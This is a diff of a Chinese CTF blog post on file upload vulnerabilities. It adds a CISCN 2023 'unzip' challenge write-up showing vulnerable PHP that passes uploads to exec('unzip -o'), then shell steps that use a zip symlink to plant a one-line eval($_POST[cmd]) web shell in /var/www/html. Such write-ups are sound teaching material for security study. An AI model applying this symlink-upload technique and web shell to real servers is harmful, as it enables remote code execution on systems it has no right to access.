@@ -26,7 +26,7 @@
 <meta property="og:image" content="https://fru1ts.github.io/2023/02/04/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/1.png">
 <meta property="og:image" content="https://fru1ts.github.io/2023/02/04/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/2.png">
 <meta property="article:published_time" content="2023-02-04T12:26:22.000Z">
-<meta property="article:modified_time" content="2023-03-02T07:53:58.311Z">
+<meta property="article:modified_time" content="2023-05-29T06:10:08.641Z">
 <meta property="article:author" content="fru1ts">
 <meta property="article:tag" content="web">
 <meta name="twitter:card" content="summary_large_image">
@@ -252,7 +252,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          4.9k words
+          5.6k words
         
       </span>
     
@@ -263,7 +263,7 @@
         
         
         
-          41 mins
+          47 mins
         
       </span>
     
@@ -314,7 +314,7 @@
               <p class="note note-info">
                 
                   
-                    Last updated on March 2, 2023 pm
+                    Last updated on May 29, 2023 pm
                   
                 
               </p>
@@ -385,6 +385,12 @@
 <h5 id="apache-解析"><a class="markdownIt-Anchor" href="#apache-解析"></a> Apache 解析</h5>
 <p>Apache 对后缀解析是从右向左的</p>
 <p><code>phpshell.php.rar.rar.rar.rar</code> 因为 Apache 不认识 <code>.rar</code> 这个文件类型，所以会一直遍历后缀到 <code>.php</code>，然后认为这是一个 PHP 文件。</p>
+<h3 id="uzip命令导致文件上传"><a class="markdownIt-Anchor" href="#uzip命令导致文件上传"></a> uzip命令导致文件上传</h3>
+<p><code>unzip()</code>存在软链接攻击</p>
+<p>可以通过上传软链接压缩包实现RCE</p>
+<h4 id="ciscn2023初赛unzip"><a class="markdownIt-Anchor" href="#ciscn2023初赛unzip"></a> ciscn2023初赛unzip</h4>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$finfo</span> = <span class="hljs-title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">finfo_file</span>(<span class="hljs-variable">$finfo</span>, <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]) === <span class="hljs-string">&#x27;application/zip&#x27;</span>)&#123;<br>        <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;cd /tmp &amp;&amp; unzip -o &#x27;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]);  <span class="hljs-comment">#有-o允许文件覆盖</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>];<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>&#125;;<br>&gt;?<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">先构造一个指向 /var/www/html 的软连接：<br><span class="hljs-built_in">ln</span> -s /var/www/html <span class="hljs-built_in">test</span><br>zip --symlinks test.zip ./*<br>再构造一个木马在<span class="hljs-built_in">test</span>目录下<br><span class="hljs-built_in">mkdir</span> <span class="hljs-built_in">test</span><br><span class="hljs-built_in">cd</span> <span class="hljs-built_in">test</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;?php eval(<span class="hljs-variable">$_POST</span>[cmd]);?&gt;&quot;</span> &gt; cmd.php<br><span class="hljs-built_in">cd</span> ..<br>zip -r test1.zip ./*<br>依次上传test.zip,test1.zip<br>这样就可以使木马cmd.php存在/var/www/html/下<br>蚁剑连接获得flag<br></code></pre></td></tr></table></figure>
 <h2 id="suctf-2019checkin-1"><a class="markdownIt-Anchor" href="#suctf-2019checkin-1"></a> [SUCTF 2019]CheckIn 1</h2>
 <p>这个题上来直接是文件上传入口，什么提示都没有，那就直接进行黑盒测试</p>
 <p>先传.php文件，不行再修改成各种后缀，发现只能是上传图片</p>
@@ -402,6 +408,7 @@
 <p><em><a target="_blank" rel="noopener" href="https://ctf-wiki.org/web/php/php/#_4">https://ctf-wiki.org/web/php/php/#_4</a></em></p>
 <p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/configuration.file.per-user.php">https://www.php.net/manual/zh/configuration.file.per-user.php</a></p>
 <p><a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">https://wooyun.js.org/drops/user.ini文件构成的PHP后门.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://lazzzaro.github.io/2020/05/06/web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/index.html">Lazzaro比较全面的文件上传</a></p>
 
                 
               </div>
